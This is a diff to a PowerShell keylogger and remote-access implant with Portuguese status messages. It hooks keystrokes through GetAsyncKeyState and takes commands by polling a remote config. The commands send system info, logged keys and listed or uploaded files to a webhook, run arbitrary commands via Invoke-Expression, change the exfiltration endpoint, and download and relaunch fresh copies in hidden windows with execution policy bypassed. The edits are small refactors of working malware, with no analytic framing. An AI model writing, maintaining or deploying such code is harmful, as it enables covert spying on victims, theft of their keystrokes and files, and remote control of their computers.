@@ -35,7 +35,7 @@ function Send($t) {
     $c = $t.Substring($i * 350, [Math]::Min(350, $t.Length - $i * 350))
     $b = @{ content = "``````$c``````" } | ConvertTo-Json
     try { Invoke-RestMethod $hook -Method Post -Body $b -ContentType "application/json" -TimeoutSec 8 }
-    catch { Write-Host "SEND FALHOU: $_" }
+    catch { Write-Host "SEND FALHOU: $($_)" }
   }
 }
 
@@ -76,13 +76,8 @@ function Uninstall {
   exit
 }
 
-try {
-  Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class K { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v); }
-"@
-} catch { Send "[erro] Add-Type :: $_" }
+$cs = 'using System; using System.Runtime.InteropServices; public class K { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v); }'
+try { Add-Type -TypeDefinition $cs } catch { Send "[erro] Add-Type :: $($_)" }
 
 if (-not ("K" -as [type])) { Send "[erro] tipo K nao carregou — a sair"; exit }
 
@@ -108,16 +103,16 @@ while ($true) {
 
       if (Flag "info") {
         try { Send "[ok] info`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)`nUptime: $((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime)`nIP: $((Get-NetIPAddress -AddressFamily IPv4 | ? {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress)" }
-        catch { Send "[falhou] info :: $_" }
+        catch { Send "[falhou] info :: $($_)" }
       }
 
-      if (Flag "dump") { try { Flush; Send "[ok] dump" } catch { Send "[falhou] dump :: $_" } }
+      if (Flag "dump") { try { Flush; Send "[ok] dump" } catch { Send "[falhou] dump :: $($_)" } }
 
       if (Flag "ls") {
         try {
           if (-not $cfg["ls_path"]) { throw "ls_path vazio" }
           Send "[ok] ls $($cfg['ls_path'])`n$((Get-ChildItem $cfg['ls_path'] | Select -First 40 Name,Length | Out-String))"
-        } catch { Send "[falhou] ls :: $($cfg['ls_path']) :: $_" }
+        } catch { Send "[falhou] ls :: $($cfg['ls_path']) :: $($_)" }
       }
 
       if (Flag "get") {
@@ -128,33 +123,33 @@ while ($true) {
           Get-Content $cfg["get_path"] -Raw | Set-Content $f2 -Encoding UTF8
           curl.exe -s -F "content=**ok** get $($cfg['get_path'])" -F "files[0]=@$f2" $hook | Out-Null
           Send "[ok] get $($cfg['get_path'])"
-        } catch { Send "[falhou] get :: $($cfg['get_path']) :: $_" }
+        } catch { Send "[falhou] get :: $($cfg['get_path']) :: $($_)" }
       }
 
       if (Flag "sh") {
         try {
           if (-not $cfg["sh_cmd"]) { throw "sh_cmd vazio" }
           Send "[ok] sh`n$((Invoke-Expression $cfg['sh_cmd'] 2>&1 | Out-String))"
-        } catch { Send "[falhou] sh :: $($cfg['sh_cmd']) :: $_" }
+        } catch { Send "[falhou] sh :: $($cfg['sh_cmd']) :: $($_)" }
       }
 
-      if (Flag "shut") { try { & $shut; Send "[ok] shut" } catch { Send "[falhou] shut :: $_" } }
+      if (Flag "shut") { try { & $shut; Send "[ok] shut" } catch { Send "[falhou] shut :: $($_)" } }
 
       if (Flag "webhook") {
         try { if (-not $cfg["webhook_url"]) { throw "webhook_url vazio" }; $hook = $cfg["webhook_url"]; Send "[ok] webhook alterado" }
-        catch { Send "[falhou] webhook :: $_" }
+        catch { Send "[falhou] webhook :: $($_)" }
       }
 
       if (Flag "update") {
         try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $shut $shutSrc; Start-Process powershell -w hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
-        catch { Send "[falhou] update :: $_" }
+        catch { Send "[falhou] update :: $($_)" }
       }
 
       if ($cfg["log"] -eq "1") { $logOn = $true } elseif ($cfg["log"] -eq "0") { $logOn = $false }
 
       if (Flag "uninstall") { Uninstall }
     }
-  } catch { if ($Debug) { Write-Host "FETCH FALHOU: $_" } }
+  } catch { if ($Debug) { Write-Host "FETCH FALHOU: $($_)" } }
 
   if ($logOn) {
     Start-Sleep -Milliseconds 12
